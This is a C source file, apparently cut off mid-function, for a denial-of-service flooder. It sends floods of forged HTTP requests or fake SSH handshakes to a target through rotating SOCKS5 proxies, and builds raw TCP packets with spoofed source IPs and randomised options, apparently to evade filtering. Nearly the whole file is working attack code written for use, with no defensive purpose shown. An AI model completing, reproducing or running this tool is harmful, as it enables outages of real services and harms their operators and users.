
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<errno.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <stdbool.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/select.h>
#include <poll.h>
// duplicate but needed for some systems
#include <netinet/tcp.h>
#ifdef __linux__
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#define HAVE_SENDMMSG
#endif

#ifndef TCP_NODELAY
#define TCP_NODELAY 1
#endif

typedef unsigned char u_char;

#define TCP_OPT_NOP           1
#define TCP_OPT_MSS           2
#define TCP_OPT_WINDOW        3
#define TCP_OPT_SACK_PERM     4
#define TCP_OPT_SACK          5
#define TCP_OPT_TIMESTAMP     8

static unsigned int floodport;
#define BUFFER_SIZE 100
char sourceip[32];
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 0;  
volatile unsigned int lenght_pkt = 0;
volatile int g_running = 1;
static volatile int g_signal_count = 0;
volatile int g_threads_ready = 0;
volatile int g_debug_logging = 1;  
pthread_mutex_t g_stats_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    uint64_t tokens;
    uint64_t max_tokens;
    uint64_t refill_rate;  
    struct timespec last_refill;
    pthread_mutex_t mutex;
} token_bucket_t;

static token_bucket_t g_rate_limiter = {0, 0, 0, {0, 0}, PTHREAD_MUTEX_INITIALIZER};
volatile int g_rate_limit_enabled = 0;

#define MAX_PROXIES 10000
#define MAX_PROXY_LINE 256

typedef struct {
    char ip[64];
    int port;
    char username[256];
    char password[256];
    int has_auth;
    int is_valid;
    uint64_t last_used;
    uint64_t failures;
} socks5_proxy_t;

socks5_proxy_t g_proxies[MAX_PROXIES];
int g_proxy_count = 0;
pthread_mutex_t g_proxy_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile int g_proxy_idx = 0;
int g_use_proxies = 0;

volatile uint64_t g_total_packets_sent = 0;
volatile uint64_t g_total_packets_failed = 0;
volatile uint64_t g_eagain_count = 0;
volatile uint64_t g_real_errors = 0;
volatile uint64_t g_error_ebadf = 0;
volatile uint64_t g_error_einval = 0;
volatile uint64_t g_error_eacces = 0;
volatile uint64_t g_error_other = 0;
volatile uint64_t g_proxy_connections = 0;
volatile uint64_t g_proxy_failures = 0;

struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};

// standard checksum calc
static inline unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum>>16) + (sum & 0xffff);
    sum = sum + (sum>>16);
    answer = (short)~sum;

    return answer;
}

int random_number_beetwhen(int min, int max);
void *proxy_worker_thread(void *par1);
void *flooding_thread(void *par1);
void *stats_thread(void *arg);

void init_rate_limiter(uint64_t max_pps) {
    pthread_mutex_lock(&g_rate_limiter.mutex);
    g_rate_limiter.max_tokens = max_pps;
    g_rate_limiter.tokens = max_pps;  // start full
    g_rate_limiter.refill_rate = max_pps;
    clock_gettime(CLOCK_MONOTONIC, &g_rate_limiter.last_refill);
    g_rate_limit_enabled = 1;
    pthread_mutex_unlock(&g_rate_limiter.mutex);
}

int consume_token(int count) {
    if (!g_rate_limit_enabled) return 1;

    pthread_mutex_lock(&g_rate_limiter.mutex);

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - g_rate_limiter.last_refill.tv_sec) + 
                     (now.tv_nsec - g_rate_limiter.last_refill.tv_nsec) / 1e9;

    if (elapsed > 0) {
        uint64_t tokens_to_add = (uint64_t)(elapsed * g_rate_limiter.refill_rate);
        g_rate_limiter.tokens = (g_rate_limiter.tokens + tokens_to_add > g_rate_limiter.max_tokens) ?
                                g_rate_limiter.max_tokens : g_rate_limiter.tokens + tokens_to_add;
        g_rate_limiter.last_refill = now;
    }

    if (g_rate_limiter.tokens >= count) {
        g_rate_limiter.tokens -= count;
        pthread_mutex_unlock(&g_rate_limiter.mutex);
        return 1;
    }

    pthread_mutex_unlock(&g_rate_limiter.mutex);
    return 0;
}

int load_socks5_proxies(const char *filename) {
    FILE *fp = fopen(filename, "r");
    if (!fp) {
        perror("Failed to open socks5.txt");
        return 0;
    }

    char line[MAX_PROXY_LINE];
    g_proxy_count = 0;

    while (fgets(line, sizeof(line), fp) && g_proxy_count < MAX_PROXIES) {

        if (line[0] == '#' || line[0] == '\n' || line[0] == '\r') {
            continue;
        }

        line[strcspn(line, "\r\n")] = 0;

        if (strlen(line) == 0) {
            continue;
        }

        socks5_proxy_t *proxy = &g_proxies[g_proxy_count];
        memset(proxy, 0, sizeof(socks5_proxy_t));

        char *saveptr = NULL;
        char *token = strtok_r(line, ":", &saveptr);
        if (!token) continue;

        size_t ip_len = strlen(token);
        if (ip_len >= sizeof(proxy->ip)) {
            continue; 
        }
        strncpy(proxy->ip, token, sizeof(proxy->ip) - 1);
        proxy->ip[sizeof(proxy->ip) - 1] = '\0';

        token = strtok_r(NULL, ":", &saveptr);
        if (!token) continue;

        proxy->port = atoi(token);
        if (proxy->port <= 0 || proxy->port > 65535) continue;

        token = strtok_r(NULL, ":", &saveptr);
        if (token) {
            size_t user_len = strlen(token);
            if (user_len >= sizeof(proxy->username)) {
                continue;
            }
            strncpy(proxy->username, token, sizeof(proxy->username) - 1);
            proxy->username[sizeof(proxy->username) - 1] = '\0';

            token = strtok_r(NULL, ":", &saveptr);
            if (token) {
                size_t pass_len = strlen(token);
                if (pass_len >= sizeof(proxy->password)) {
                    continue;
                }
                strncpy(proxy->password, token, sizeof(proxy->password) - 1);
                proxy->password[sizeof(proxy->password) - 1] = '\0';
                proxy->has_auth = 1;
            }
        }

        proxy->is_valid = 1;
        proxy->last_used = 0;
        proxy->failures = 0;
        g_proxy_count++;
    }

    fclose(fp);
    return g_proxy_count;
}

int socks5_connect(int sockfd, const char *target_ip, int target_port, socks5_proxy_t *proxy) {

    struct timeval tv;
    tv.tv_sec = 0;  
    tv.tv_usec = 500000;  
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    unsigned char handshake[3] = {0x05, 0x01, proxy->has_auth ? 0x02 : 0x00};
    ssize_t sent = send(sockfd, handshake, 3, 0);
    if (sent != 3) {
        return -1; 
    }

    unsigned char response[2];
    ssize_t recv_len = recv(sockfd, response, 2, MSG_WAITALL);
    if (recv_len != 2 || response[0] != 0x05) {
        return -1; 
    }

    if (proxy->has_auth && response[1] != 0x02) {
        return -1; 
    }

    if (proxy->has_auth && response[1] == 0x02) {
        int ulen = strlen(proxy->username);
        int plen = strlen(proxy->password);
        if (ulen > 255 || plen > 255 || ulen == 0 || plen == 0) {
            return -1;
        }

        unsigned char auth[3 + 255 + 255];
        auth[0] = 0x01; 
        auth[1] = (unsigned char)ulen; 
        memcpy(auth + 2, proxy->username, ulen);
        auth[2 + ulen] = (unsigned char)plen; 
        memcpy(auth + 3 + ulen, proxy->password, plen);

        sent = send(sockfd, auth, 3 + ulen + plen, 0);
        if (sent != (3 + ulen + plen)) {
            return -1;
        }

        unsigned char auth_response[2];
        recv_len = recv(sockfd, auth_response, 2, MSG_WAITALL);
        if (recv_len != 2 || auth_response[0] != 0x01 || auth_response[1] != 0x00) {
            return -1; 
        }
    } else if (proxy->has_auth) {
        return -1; 
    }

    struct in_addr addr;
    if (inet_aton(target_ip, &addr) == 0) {
        return -1; 
    }

    unsigned char connect_req[10];
    connect_req[0] = 0x05; 
    connect_req[1] = 0x01; 
    connect_req[2] = 0x00; 
    connect_req[3] = 0x01; 
    memcpy(connect_req + 4, &addr.s_addr, 4);
    connect_req[8] = (target_port >> 8) & 0xFF;
    connect_req[9] = target_port & 0xFF;

    sent = send(sockfd, connect_req, 10, 0);
    if (sent != 10) {
        return -1;
    }

    unsigned char connect_resp_buf[256];
    ssize_t resp_len = recv(sockfd, connect_resp_buf, sizeof(connect_resp_buf), 0);
    if (resp_len < 4) {
        return -1; 
    }

    if (connect_resp_buf[0] != 0x05) {
        return -1; 
    }

    if (connect_resp_buf[1] != 0x00) {

        return -1;
    }

    return 0; 
}

socks5_proxy_t* get_next_proxy() {
    if (g_proxy_count == 0) return NULL;

    int attempts = 0;
    socks5_proxy_t *proxy = NULL;

    while (attempts < g_proxy_count) {

        int idx = __sync_fetch_and_add(&g_proxy_idx, 1) % g_proxy_count;
        proxy = &g_proxies[idx];

        uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
        if (proxy->is_valid && failures < 30) {
            proxy->last_used = time(NULL); 
            return proxy;
        }

        attempts++;
    }

    for (int i = 0; i < g_proxy_count; i++) {
        proxy = &g_proxies[i];
        uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
        if (proxy->is_valid && failures < 100) {

            __sync_lock_test_and_set((uint64_t*)&proxy->failures, 0);
            proxy->last_used = time(NULL);
            return proxy;
        }
    }

    return NULL;
}

void mark_proxy_failed(socks5_proxy_t *proxy) {
    if (proxy) {
        __sync_add_and_fetch(&proxy->failures, 1);
    }
}

void build_tcp_options(uint8_t *options, int *optlen, uint32_t ack_seq) {
    int offset = 0;
    const int max_options = 40;

    if (offset + 4 <= max_options) {
        options[offset++] = TCP_OPT_MSS;
        options[offset++] = 4;

        uint16_t mss = htons(1300 + (random_number_beetwhen(0, 160)));
        memcpy(&options[offset], &mss, 2);
        offset += 2;
    }

    if (offset + 3 <= max_options) {
        options[offset++] = TCP_OPT_WINDOW;
        options[offset++] = 3;

        options[offset++] = 7 + (random_number_beetwhen(0, 7));
    }

    if (offset + 10 <= max_options) {
        options[offset++] = TCP_OPT_TIMESTAMP;
        options[offset++] = 10;
        uint32_t ts_val = htonl((uint32_t)time(NULL) * 1000 + random_number_beetwhen(0, 999));
        memcpy(&options[offset], &ts_val, 4);
        offset += 4;

        uint32_t ts_ecr = htonl((uint32_t)time(NULL) * 1000 - random_number_beetwhen(1, 1000));
        memcpy(&options[offset], &ts_ecr, 4);
        offset += 4;
    }

    if (offset + 2 <= max_options) {
        options[offset++] = TCP_OPT_SACK_PERM;
        options[offset++] = 2;
    }

    int sack_blocks = 1 + (random_number_beetwhen(0, 2)); 
    for (int i = 0; i < sack_blocks && (offset + 10) <= max_options; i++) {
        options[offset++] = TCP_OPT_SACK;
        options[offset++] = 10;

        uint32_t gap = random_number_beetwhen(1460, 14600);
        uint32_t sle = ack_seq + gap;
        sle = htonl(sle);
        memcpy(&options[offset], &sle, 4);
        offset += 4;

        uint32_t sre = ntohl(sle) + random_number_beetwhen(1460, 7300);
        sre = htonl(sre);
        memcpy(&options[offset], &sre, 4);
        offset += 4;
    }

    while (offset % 4 != 0 && offset < max_options) {
        options[offset++] = TCP_OPT_NOP;
    }

    if (offset > max_options) {
        offset = max_options;
    }

    *optlen = offset;
}

static inline uint32_t generate_spoofed_ip(int thread_id, int iteration) {
    // mix thread id, iteration, and time for variety
    uint32_t time_seed = (uint32_t)time(NULL);
    uint32_t rotation_key = (thread_id * 7919) + (iteration * 997) + (time_seed * 8191) + 
                           (iteration * 3571) + (thread_id * 5779) + (iteration * 7919);
    int ip_class = rotation_key % 120;  // spread across 120 ranges  
    uint32_t ip_offset = rotation_key % 16777216;
    uint32_t new_ip;

    if (ip_class < 3) {
        new_ip = (10UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 6) {
        uint32_t subnet = 16 + ((ip_offset >> 16) % 16);
        new_ip = (172UL << 24) | (subnet << 16) | (ip_offset & 0x0000FFFF);  
    } else if (ip_class < 9) {
        new_ip = (192UL << 24) | (168UL << 16) | (ip_offset & 0x0000FFFF);  
    } else if (ip_class < 12) {
        new_ip = (1UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 15) {
        new_ip = (8UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 18) {
        new_ip = (14UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 21) {
        new_ip = (23UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 24) {
        new_ip = (24UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 27) {
        new_ip = (27UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 30) {
        new_ip = (31UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 33) {
        new_ip = (37UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 36) {
        new_ip = (41UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 39) {
        new_ip = (42UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 42) {
        new_ip = (46UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 45) {
        new_ip = (47UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 48) {
        new_ip = (49UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 51) {
        new_ip = (54UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 54) {
        new_ip = (78UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 57) {
        new_ip = (88UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 60) {
        new_ip = (91UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 63) {
        new_ip = (93UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 66) {
        new_ip = (103UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 69) {
        new_ip = (104UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 72) {
        new_ip = (141UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 75) {
        new_ip = (149UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 78) {
        new_ip = (185UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 81) {
        new_ip = (188UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 84) {
        new_ip = (192UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 87) {
        new_ip = (203UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 90) {
        new_ip = (213UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 93) {
        new_ip = (217UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 96) {
        new_ip = (220UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 105) {
        new_ip = (223UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 110) {
        new_ip = (45UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else if (ip_class < 115) {
        new_ip = (51UL << 24) | (ip_offset & 0x00FFFFFF);  
    } else {
        // random public IP, avoid reserved ranges
        int octet1 = random_number_beetwhen(1, 223);

        while (octet1 == 127 || octet1 == 0 || (octet1 >= 224 && octet1 <= 255) ||
               octet1 == 10 || octet1 == 172 || octet1 == 192) {
            octet1 = random_number_beetwhen(1, 223);
        }
        new_ip = (octet1 << 24) | (ip_offset & 0x00FFFFFF);
    }

    return new_ip;
}

void *proxy_worker_thread(void *par1) {
    if (!par1) {
        return NULL;
    }

    char *target_ip = (char *)par1;
    long thread_id = (long)pthread_self();
    int consecutive_failures = 0;
    int iterations = 0;

    __sync_add_and_fetch(&g_threads_ready, 1);

    char http_template[512];
    snprintf(http_template, sizeof(http_template), 
        "GET /?id=%lu&t=%lu HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: max-age=0\r\n"
        "\r\n",
        (unsigned long)thread_id, (unsigned long)time(NULL), target_ip);

    const int max_concurrent = 500;
    int active_sockets[max_concurrent];
    socks5_proxy_t *active_proxies[max_concurrent];
    int active_count = 0;
    uint64_t request_id = thread_id * 1000000;

    char ssh_prefix[] = "SSH-2.0-OpenSSH_8.0\r\nKEYEXINIT";
    char ssh_mid[] = "\r\nNEWKEYS";
    char ssh_mid2[] = "\r\nSERVICE_REQUEST";
    char ssh_suffix[] = "\r\n";

    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    };
    int ua_count = sizeof(user_agents) / sizeof(user_agents[0]);

    char http_suffix[] = "\r\n";
    const int http_suffix_len = 2;

    time_t cached_time = time(NULL);
    int time_update_counter = 0;

    while (g_running) {
        iterations++;

        int connection_attempts = 0;
        int max_attempts_per_iteration = 30;

        if (active_count > 0 && active_count < max_concurrent / 2) {
            max_attempts_per_iteration = 50;
        }

        while (active_count < max_concurrent && g_running && connection_attempts < max_attempts_per_iteration) {
            connection_attempts++;

        socks5_proxy_t *proxy = get_next_proxy();
        if (!proxy || !proxy->is_valid) {
            if (g_proxy_count == 0) {
                    break;
                }
                continue;
            }

            uint64_t failures = __sync_fetch_and_add(&proxy->failures, 0);
            if (failures > 30) {
                continue;
        }

            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
                mark_proxy_failed(proxy);
            continue;
        }

            int sendbuf = 64 * 1024 * 1024;
            int recvbuf = 64 * 1024 * 1024;
            setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
            setsockopt(sockfd, SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));

            int nodelay = 1;
            setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));

        int flags = fcntl(sockfd, F_GETFL, 0);
        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);

        struct sockaddr_in proxy_addr;
        memset(&proxy_addr, 0, sizeof(proxy_addr));
        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(proxy->port);
        if (inet_aton(proxy->ip, &proxy_addr.sin_addr) == 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            continue;
        }

            connect(sockfd, (struct sockaddr *)&proxy_addr, sizeof(proxy_addr));

            struct pollfd pfd;
            pfd.fd = sockfd;
            pfd.events = POLLOUT;
            int poll_result = poll(&pfd, 1, 50);

            if (poll_result <= 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &so_error, &len) < 0 || so_error != 0) {
            close(sockfd);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }

        fcntl(sockfd, F_SETFL, flags);

            int connect_result = socks5_connect(sockfd, target_ip, floodport, proxy);
            if (connect_result < 0) {
            close(sockfd);
                __sync_add_and_fetch(&g_proxy_failures, 1);
                mark_proxy_failed(proxy);
            consecutive_failures++;
            continue;
        }

            active_sockets[active_count] = sockfd;
            active_proxies[active_count] = proxy;
            active_count++;
            __sync_add_and_fetch(&g_proxy_connections, 1);
        consecutive_failures = 0;

            for (int i = 0; i < 10000 && g_running; i++) {
            char data[512];
                request_id++;
                int data_len;

                if (floodport == 22) {
                    data_len = snprintf(data, sizeof(data), "%s%lu%s%lu%s%lu%s", 
                        ssh_prefix, request_id, ssh_mid, request_id * 100, 
                        ssh_mid2, request_id * 1000, ssh_suffix);
                } else {
                    if (time_update_counter++ % 100 == 0) {
                        cached_time = time(NULL);
                    }

                    const char* ua = user_agents[request_id % ua_count];

                    int len = snprintf(data, sizeof(data),
                        "GET /?id=%lu&t=%lu&i=%lu&r=%lu&_=%lu HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.9\r\n"
                        "Accept-Encoding: gzip, deflate, br\r\n"
                "Connection: keep-alive\r\n"
                        "Upgrade-Insecure-Requests: 1\r\n"
                        "Sec-Fetch-Dest: document\r\n"
                        "Sec-Fetch-Mode: navigate\r\n"
                        "Sec-Fetch-Site: none\r\n"
                        "Cache-Control: max-age=0\r\n",
                        request_id, (unsigned long)cached_time, request_id, request_id * 7, request_id,
                        target_ip, floodport, ua);

                    memcpy(data + len, http_suffix, http_suffix_len);
                    data_len = len + http_suffix_len;
                }

                if (g_rate_limit_enabled) {
                    if (!consume_token(1)) {
                        static __thread struct timespec rate_sleep = {0, 1000};
                        nanosleep(&rate_sleep, NULL);
                        continue;
                    }
                }

                ssize_t sent = send(sockfd, data, data_len, MSG_DONTWAIT);
            if (sent > 0) {
                __sync_add_and_fetch(&g_total_packets_sent, 1);
                __sync_add_and_fetch(&pps, 1);
                } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    break;
                }
            }
        }

        for (int sock_idx = active_count - 1; sock_idx >= 0 && g_running; sock_idx--) {
            int sockfd = active_sockets[sock_idx];
            if (sockfd < 0) {
                if (active_count > 1) {
                    active_sockets[sock_idx] = active_sockets[active_count - 1];
                    active_proxies[sock_idx] = active_proxies[active_count - 1];
                }
                active_count--;
                    continue;
            }

            int sent_count = 0;
            int consecutive_errors = 0;
            for (int i = 0; i < 200000 && g_running && consecutive_errors < 2; i++) {
                char data[512];
                request_id++;

                int data_len;
                if (floodport == 22) {
                    data_len = snprintf(data, sizeof(data), "%s%lu%s%lu%s%lu%s", 
                        ssh_prefix, request_id, ssh_mid, request_id * 100, 
                        ssh_mid2, request_id * 1000, ssh_suffix);
                } else {
                    if (time_update_counter++ % 200 == 0) {
                        cached_time = time(NULL);
                    }

                    const char* ua = user_agents[request_id % ua_count];

                    int len = snprintf(data, sizeof(data),
                        "GET /?id=%lu&t=%lu&i=%lu&r=%lu&_=%lu HTTP/1.1\r\n"
                        "Host: %s:%d\r\n"
                        "User-Agent: %s\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.9\r\n"
                        "Accept-Encoding: gzip, deflate, br\r\n"
                        "Connection: keep-alive\r\n"
                        "Upgrade-Insecure-Requests: 1\r\n"
                        "Sec-Fetch-Dest: document\r\n"
                        "Sec-Fetch-Mode: navigate\r\n"
                        "Sec-Fetch-Site: none\r\n"
                        "Sec-Fetch-User: ?1\r\n"
                        "Cache-Control: max-age=0\r\n"
                        "DNT: 1\r\n"
                        "Pragma: no-cache\r\n",
                        request_id, (unsigned long)cached_time, request_id, request_id * 7, request_id,
                        target_ip, floodport, ua);

                    memcpy(data + len, http_suffix, http_suffix_len);
                    data_len = len + http_suffix_len;
                }
                if (g_rate_limit_enabled) {
                    if (!consume_token(1)) {
                        static __thread struct timespec rate_sleep = {0, 1000};
                        nanosleep(&rate_sleep, NULL);
                        continue;
                    }
                }

                ssize_t sent = send(sockfd, data, data_len, MSG_DONTWAIT);
                if (sent > 0) {
                    __sync_add_and_fetch(&g_total_packets_sent, 1);
                    __sync_add_and_fetch(&pps, 1);
                    sent_count++;
                    consecutive_errors = 0;
                } else {
                    int saved_errno = errno;
                    if (saved_errno == EAGAIN || saved_errno == EWOULDBLOCK) {
                        break;
                    } else {
                        consecutive_errors++;
                        if (consecutive_errors >= 2) {
                            close(sockfd);
                            if (active_count > 1 && sock_idx < active_count - 1) {
                                active_sockets[sock_idx] = active_sockets[active_count - 1];
                                active_proxies[sock_idx] = active_proxies[active_count - 1];
                            }
                            active_count--;
                            sock_idx++;
                            break;
                        }
                    }
                }
            }
        }
    }

    for (int i = 0; i < active_count; i++) {
        if (active_sockets[i] >= 0) {
            close(active_sockets[i]);
        }
    }

    return NULL;
}

void *proxy_worker_thread_wrapper(void *par1) {
    void *result = NULL;
    result = proxy_worker_thread(par1);
    return result;
}

typedef struct {
    uint32_t source_ip;
    uint16_t source_port;
    uint32_t seq_base;
    uint32_t ack_base;
    uint32_t seq_current;
    uint32_t ack_current;
    uint64_t packet_count;
    uint16_t window_size;
    uint8_t ttl;
} conn_state_t;

#define MAX_CONN_STATES 50000
#define CONN_HASH_TABLE_SIZE 65536
conn_state_t* get_conn_state(conn_state_t *conn_states, int *conn_state_count,
                             uint32_t source_ip, uint16_t source_port,
                             uint32_t base_seq, uint32_t base_ack,
                             int *hash_table) {
    uint32_t hash = (source_ip ^ source_port) & (CONN_HASH_TABLE_SIZE - 1);
    int idx = hash_table[hash];
    if (idx >= 0 && idx < *conn_state_count) {
        if (conn_states[idx].source_ip == source_ip && conn_states[idx].source_port == source_port) {
            return &conn_states[idx];
        }
    }
    for (int i = 0; i < *conn_state_count; i++) {
        if (conn_states[i].source_ip == source_ip && conn_states[i].source_port == source_port) {
            hash_table[hash] = i;
            return &conn_states[i];
        }
    }
    if (*conn_state_count < MAX_CONN_STATES) {
        conn_state_t *state = &conn_states[(*conn_state_count)++];
        state->source_ip = source_ip;
        state->source_port = source_port;
        state->seq_base = base_seq;
        state->ack_base = base_ack;
        state->seq_current = base_seq + 1460;
        state->ack_current = base_ack + 1460;
        state->packet_count = 0;
        state->window_size = random_number_beetwhen(16384, 65535);
        state->ttl = 64;
        hash_table[hash] = *conn_state_count - 1;
        return state;
    }
    return &conn_states[hash % MAX_CONN_STATES];
}

void *flooding_thread(void *par1) {
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);

    __sync_add_and_fetch(&g_threads_ready, 1);

    long thread_id = (long)pthread_self();

    conn_state_t *conn_states = (conn_state_t *)calloc(MAX_CONN_STATES, sizeof(conn_state_t));
    int *hash_table = (int *)calloc(CONN_HASH_TABLE_SIZE, sizeof(int));
    int conn_state_count = 0;

    if (hash_table) {
        for (int i = 0; i < CONN_HASH_TABLE_SIZE; i++) {
            hash_table[i] = -1;
        }
    }

    const int num_sockets = 10000;
    int *sockets = (int *)calloc(num_sockets, sizeof(int));
    if (!sockets) {
        if (conn_states) free(conn_states);
        if (hash_table) free(hash_table);
        return NULL;
    }
    int sockets_created = 0;

    for (int i = 0; i < num_sockets; i++) {
        sockets[i] = -1;
    }

    typedef struct {
        int *sockets;
        int sockets_created;
        int num_sockets;
        conn_state_t *conn_states;
        int *hash_table;
    } thread_cleanup_data_t;

    thread_cleanup_data_t cleanup_data;
    cleanup_data.sockets = sockets;
    cleanup_data.sockets_created = 0;
    cleanup_data.num_sockets = num_sockets;
    cleanup_data.conn_states = conn_states;
    cleanup_data.hash_table = hash_table;

    void cleanup_handler(void *arg) {
        thread_cleanup_data_t *data = (thread_cleanup_data_t *)arg;
        if (data && data->sockets) {
            for (int i = 0; i < data->num_sockets; i++) {
                if (data->sockets[i] != -1) {
                    close(data->sockets[i]);
                    data->sockets[i] = -1;
                }
            }
            free(data->sockets);
        }
        if (data && data->conn_states) {
            free(data->conn_states);
        }
        if (data && data->hash_table) {
            free(data->hash_table);
        }
    }

    for (int sock_idx = 0; sock_idx < num_sockets; sock_idx++) {
        sockets[sock_idx] = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sockets[sock_idx] == -1) {
            int saved_errno = errno;
            if (sock_idx == 0) {
                if (saved_errno == EPERM || saved_errno == EACCES) {
                }
                free(sockets);
                if (conn_states) free(conn_states);
                if (hash_table) free(hash_table);
                return NULL;
            }
            continue;
        }

        int one = 1;
        if (setsockopt(sockets[sock_idx], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            close(sockets[sock_idx]);
            sockets[sock_idx] = -1;
            continue;
        }

        int sendbuf = 1024 * (1024 * 1024);
        int recvbuf = 1024 * (1024 * 1024);
        setsockopt(sockets[sock_idx], SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));
        setsockopt(sockets[sock_idx], SOL_SOCKET, SO_RCVBUF, &recvbuf, sizeof(recvbuf));
        int sendbuf_large = sendbuf * 2;
        int recvbuf_large = recvbuf * 2;
